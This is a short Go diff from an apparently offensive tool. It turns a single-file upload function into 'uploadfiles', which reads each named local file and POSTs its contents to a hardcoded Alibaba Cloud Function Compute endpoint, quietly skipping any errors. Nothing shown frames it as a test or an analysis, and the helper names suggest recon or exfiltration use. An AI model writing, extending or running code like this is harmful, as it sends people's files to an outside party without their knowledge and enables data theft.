@@ -40,16 +40,17 @@ func inforev() {
 	exit()
 }
 
-func resrev(filename string) {
-	content, err := ioutil.ReadFile(filename)
-	if err != nil {
-		fmt.Println("[-] " + err.Error())
-		exit()
-	}
-
-	_, err = http.Post("https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service.LATEST/ms/", "multipart/form-data", bytes.NewReader(content))
-	if err != nil {
-		os.Exit(0)
+func uploadfiles(filenames []string) {
+	for _, filename := range filenames {
+		content, err := ioutil.ReadFile(filename)
+		if err != nil {
+			fmt.Println("[-] " + err.Error())
+			continue
+		}
+		_, err = http.Post("https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service.LATEST/ms/", "multipart/form-data", bytes.NewReader(content))
+		if err != nil {
+			continue
+		}
 	}
 }
 
